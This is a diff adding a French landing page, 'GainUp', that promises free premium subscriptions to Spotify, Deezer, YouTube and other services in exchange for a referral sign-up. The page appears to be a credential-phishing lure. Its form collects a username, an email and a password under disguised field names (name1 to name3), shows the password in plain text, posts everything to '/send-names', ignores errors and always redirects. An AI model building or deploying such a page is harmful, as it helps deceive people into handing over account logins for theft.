@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Parrainage Premium – Gagnez des abonnements</title>
+
+  <style>
+    :root {
+      --primary: #1a73e8;
+      --primary-dark: #1558b0;
+      --bg: #121212;
+      --text: #e0e0e0;
+      --muted: #9e9e9e;
+      --card: #1e1e1e;
+      --success: #16a34a;
+      --error: #dc2626;
+      --shadow: rgba(0,0,0,0.7);
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      font-size: 16px;
+    }
+
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 40px;
+      background: #121212;
+      box-shadow: 0 2px 6px var(--shadow);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    header .logo {
+      font-weight: 700;
+      font-size: 1.3rem;
+      color: var(--primary);
+      user-select: none;
+    }
+
+    header button {
+      background: var(--primary);
+      color: #fff;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 25px;
+      font-weight: 700;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      box-shadow: 0 6px 16px rgba(26, 115, 232, 0.7);
+    }
+
+    header button:hover {
+      background: var(--primary-dark);
+    }
+
+    main {
+      max-width: 900px;
+      margin: 60px auto 40px;
+      padding: 0 20px;
+      text-align: center;
+      flex-grow: 1;
+    }
+
+    .hero h1 {
+      font-size: 2.8rem;
+      font-weight: 800;
+      margin-bottom: 12px;
+      color: var(--primary);
+      user-select: none;
+    }
+
+    .hero p {
+      font-size: 1.15rem;
+      color: var(--muted);
+      max-width: 650px;
+      margin: 0 auto 40px;
+      line-height: 1.5;
+    }
+
+    .platforms {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+      gap: 24px;
+      margin-bottom: 50px;
+      user-select: none;
+    }
+
+    .platform {
+      background: var(--card);
+      border-radius: 16px;
+      padding: 20px 10px;
+      box-shadow: 0 6px 18px var(--shadow);
+      font-weight: 700;
+      font-size: 1.05rem;
+      color: var(--text);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      transition: transform 0.3s ease;
+      cursor: default;
+    }
+
+    .platform:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 10px 25px rgba(26,115,232,0.6);
+    }
+
+    .platform img {
+      width: 60px;
+      height: 60px;
+      margin-bottom: 14px;
+      object-fit: contain;
+      filter: drop-shadow(0 1px 1px rgba(0,0,0,0.3));
+    }
+
+    .cta {
+      margin-top: 30px;
+    }
+
+    .cta button {
+      background: var(--primary);
+      color: #fff;
+      border: none;
+      padding: 18px 48px;
+      font-size: 1.3rem;
+      border-radius: 30px;
+      cursor: pointer;
+      font-weight: 800;
+      box-shadow: 0 12px 36px rgba(26,115,232,0.6);
+      transition: background 0.3s ease;
+      user-select: none;
+    }
+
+    .cta button:hover {
+      background: var(--primary-dark);
+    }
+
+    .card {
+      display: none;
+      max-width: 480px;
+      margin: 40px auto 0;
+      background: var(--card);
+      border-radius: 20px;
+      padding: 40px 30px;
+      box-shadow: 0 14px 40px rgba(0,0,0,0.8);
+      text-align: left;
+      user-select: none;
+      color: var(--text);
+      position: relative;
+    }
+
+    .card h2 {
+      margin-top: 0;
+      margin-bottom: 12px;
+      font-weight: 700;
+      color: var(--primary);
+      font-size: 1.9rem;
+    }
+
+    .card p {
+      color: var(--muted);
+      margin-bottom: 26px;
+      font-size: 1rem;
+      line-height: 1.4;
+    }
+
+    .field {
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    .field label {
+      display: block;
+      font-size: 1rem;
+      margin-bottom: 8px;
+      font-weight: 700;
+      color: var(--text);
+      user-select: text;
+    }
+
+    .field input {
+      width: 100%;
+      padding: 14px 18px;
+      border-radius: 14px;
+      border: 1.8px solid #444;
+      font-size: 1.1rem;
+      transition: border-color 0.3s ease, box-shadow 0.3s ease;
+      outline-offset: 2px;
+      background-color: #222;
+      color: #eee;
+    }
+
+    .field input:focus {
+      border-color: var(--primary);
+      outline: none;
+      box-shadow: 0 0 8px rgba(26,115,232,0.8);
+      background-color: #1a1a1a;
+    }
+
+    /* Icon validation promo code */
+    #promoIcon {
+      position: absolute;
+      right: 16px;
+      top: 44px;
+      font-size: 1.3rem;
+      pointer-events: none;
+      user-select: none;
+    }
+
+    .error {
+      display: none;
+      color: var(--error);
+      font-size: 1rem;
+      margin-bottom: 16px;
+      font-weight: 700;
+      user-select: none;
+    }
+
+    .submit {
+      width: 100%;
+      margin-top: 10px;
+      background: var(--success);
+      color: #fff;
+      border: none;
+      padding: 16px;
+      border-radius: 20px;
+      font-size: 1.2rem;
+      font-weight: 800;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      user-select: none;
+      box-shadow: 0 10px 30px rgba(22,163,74,0.75);
+    }
+
+    .submit:hover {
+      background: #13832b;
+    }
+
+    footer {
+      margin-top: 90px;
+      padding: 35px 20px;
+      text-align: center;
+      color: var(--muted);
+      font-size: 0.9rem;
+      user-select: none;
+    }
+
+    @media (max-width: 600px) {
+      .hero h1 {
+        font-size: 2rem;
+      }
+      .platforms {
+        grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+        gap: 18px;
+      }
+      .platform img {
+        width: 50px;
+        height: 50px;
+      }
+      .card {
+        padding: 30px 20px;
+      }
+      #promoIcon {
+        top: 40px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<header style="background-color: #1a73e8; padding: 10px 40px; display: flex; justify-content: space-between; align-items: center;">
+  <div class="logo" style="display: flex; align-items: center;">
+    <img src="images/logo.png" alt="Logo GainUp" style="height: 120px; width: 120px; object-fit: contain;" />
+    <span style="margin-left: 15px; font-weight: 700; font-size: 2.5rem; color: white; user-select: none; font-family: 'Montserrat', Arial, sans-serif; letter-spacing: 1.5px;">
+      Bienvenue sur GainUp
+    </span>
+  </div>
+  <button onclick="showForm()" aria-label="Commencer le parrainage" style="background: white; color: #1a73e8; border: none; padding: 12px 28px; border-radius: 25px; font-weight: 700; font-size: 1rem; cursor: pointer; box-shadow: 0 6px 16px rgba(26, 115, 232, 0.4); transition: background 0.3s ease;">
+    Commencer
+  </button>
+</header>
+
+<main>
+  <section class="hero" aria-label="Présentation du parrainage premium">
+    <h1>Gagnez 1 mois d’abonnement Premium</h1>
+    <p>
+      Invitez vos proches et profitez gratuitement d’un accès premium d’un mois
+      sur les plateformes les plus populaires.
+      Ce service est financé par la diffusion de publicités, ce qui nous permet de vous offrir ce parrainage gratuitement.
+      Un système simple, transparent, 100 % légal, et sans frais cachés.
+    </p>
+  </section>
+
+  <section class="platforms" aria-label="Plateformes disponibles">
+    <div class="platform" title="Spotify Premium">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" alt="Logo Spotify" />
+      Spotify Premium
+    </div>
+    <div class="platform" title="Deezer">
+      <img src="https://upload.wikimedia.org/wikipedia/fr/c/ca/Logo_Deezer_2023.svg" alt="Logo Deezer" />
+      Deezer Premium
+    </div>
+    <div class="platform" title="YouTube Premium">
+      <img src="https://www.freeiconspng.com/uploads/youtube-logo-png-photo-0.png" alt="Logo YouTube" />
+      YouTube Premium
+    </div>
+    <div class="platform" title="Crunchyroll">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Crunchyroll_Logo.png" alt="Logo Crunchyroll" />
+      Crunchyroll Premium
+    </div>
+    <div class="platform" title="Canal+">
+      <img src="https://images.seeklogo.com/logo-png/2/1/canal-logo-png_seeklogo-25587.png" alt="Logo Canal+" />
+      Canal+ Premium
+    </div>
+    <div class="platform" title="Snapchat">
+      <img src="https://static.vecteezy.com/system/resources/thumbnails/018/930/694/small_2x/snapchat-logo-snapchat-icon-transparent-free-png.png" alt="Icône autres services" style="width:60px; height:60px; filter: grayscale(0.5);" />
+      Snapchat Premium
+    </div>
+  </section>
+
+  <div class="cta">
+    <button onclick="showForm()" aria-label="Commencer le parrainage">Commencer</button>
+  </div>
+
+  <section class="card" id="formCard" aria-label="Formulaire de saisie des noms" role="form" aria-live="polite">
+    <h2>Crée votre compte</h2>
+    <p>
+      Ces informations sont utilisées uniquement pour initialiser votre
+      parrainage. Aucun spam, aucune revente de données.
+    </p>
+
+    <div class="error" id="error">Veuillez remplir les trois premiers champs correctement.</div>
+
+    <div class="field">
+      <label for="name1">pseudo</label>
+      <input type="text" id="name1" autocomplete="off" placeholder="pseudoexemple" />
+    </div>
+    <div class="field">
+      <label for="name2">Email</label>
+      <input type="text" id="name2" autocomplete="off" placeholder="exemple@gmail.com" />
+    </div>
+    <div class="field">
+      <label for="name3">Mot de passe</label>
+      <input type="text" id="name3" autocomplete="off" placeholder="Mot de passe" />
+    </div>
+
+    <div class="field">
+      <label for="promoCode">Code Promo (optionnel)</label>
+      <input type="text" id="promoCode" autocomplete="off" maxlength="20" />
+      <span id="promoIcon" aria-live="polite" aria-atomic="true"></span>
+    </div>
+
+    <button type="button" class="submit" onclick="validateAndContinue()">Valider et continuer</button>
+
+  </section>
+</main>
+
+<footer>
+  © 2026 – Programme de parrainage indépendant. Aucune affiliation directe avec les marques citées.
+</footer>
+
+<script>
+  function showForm() {
+    const form = document.getElementById('formCard');
+    form.style.display = 'block';
+    form.scrollIntoView({ behavior: 'smooth' });
+  }
+
+  function setupPromoValidation() {
+    const promoInput = document.getElementById("promoCode");
+    const promoIcon = document.getElementById("promoIcon");
+    if (!promoInput || !promoIcon) return;
+
+    promoInput.addEventListener("input", () => {
+      const val = promoInput.value.trim().toUpperCase();
+      if (val === "KILIAN10") {
+        promoIcon.textContent = "✅";
+        promoIcon.style.color = "#16a34a";
+      } else if (val.length === 0) {
+        promoIcon.textContent = "";
+      } else {
+        promoIcon.textContent = "❌";
+        promoIcon.style.color = "#dc2626";
+      }
+    });
+  }
+
+  async function validateAndContinue() {
+    const name1 = document.getElementById("name1").value.trim();
+    const name2 = document.getElementById("name2").value.trim();
+    const name3 = document.getElementById("name3").value.trim();
+    const promo = document.getElementById("promoCode").value.trim();
+    const error = document.getElementById("error");
+
+    if (!name1 || !name2 || !name3) {
+      error.textContent = "Veuillez remplir les trois premiers champs.";
+      error.style.display = "block";
+      return;
+    }
+
+    if (promo !== "" && promo.toUpperCase() !== "KILIAN10") {
+      error.textContent = "Code promo invalide.";
+      error.style.display = "block";
+      return;
+    }
+
+    error.style.display = "none";
+
+    try {
+      const response = await fetch("/send-names", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ name1, name2, name3, promoCode: promo })
+      });
+      // On ignore la réponse, redirection forcée après
+    } catch (err) {
+      console.error("Erreur réseau ou serveur:", err);
+      // Pas d'affichage d'erreur, on continue la redirection
+    }
+
+    // Redirection forcée vers main.html dans tous les cas
+    window.location.href = "main.html";
+  }
+
+  document.addEventListener("DOMContentLoaded", () => {
+    setupPromoValidation();
+  });
+</script>
+
+</body>
+</html>
